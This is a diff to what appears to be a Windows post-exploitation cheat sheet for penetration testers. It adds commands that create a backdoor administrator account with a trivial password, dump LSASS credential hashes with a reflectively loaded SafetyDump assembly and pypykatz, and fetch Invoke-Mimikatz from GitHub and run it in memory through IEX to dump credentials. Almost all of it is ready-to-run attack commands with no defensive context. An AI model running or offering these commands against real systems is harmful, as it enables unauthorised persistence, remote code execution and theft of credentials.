@@ -46,6 +46,29 @@ $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassNa
 > Note: this method requires elevated privileges.
 
 ```
-net user /add hacker hackerpassword
-net localgroup administrators hacker
+net user /add hacker 1234
+net localgroup administrators hacker /add
+```
+
+***
+
+## Hash dumping
+> Note: this method requires elevated privileges.
+
+### SafetyDump
+Dump hashes:
+```powershell
+[System.Reflection.Assembly]::Load([Convert]::FromBase64String($b64_safetydump))
+[SafetyDump.Program]::Main("<lsass_pid>")
+```
+
+Parse dump:
+```
+pypykatz lsa minidump <dump_file>
+```
+
+### Mimikatz - reflective PE injection
+```
+(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/refs/heads/master/Invoke-Mimikatz.ps1') | IEX
+Invoke-Mimikatz -DumpCreds
 ```
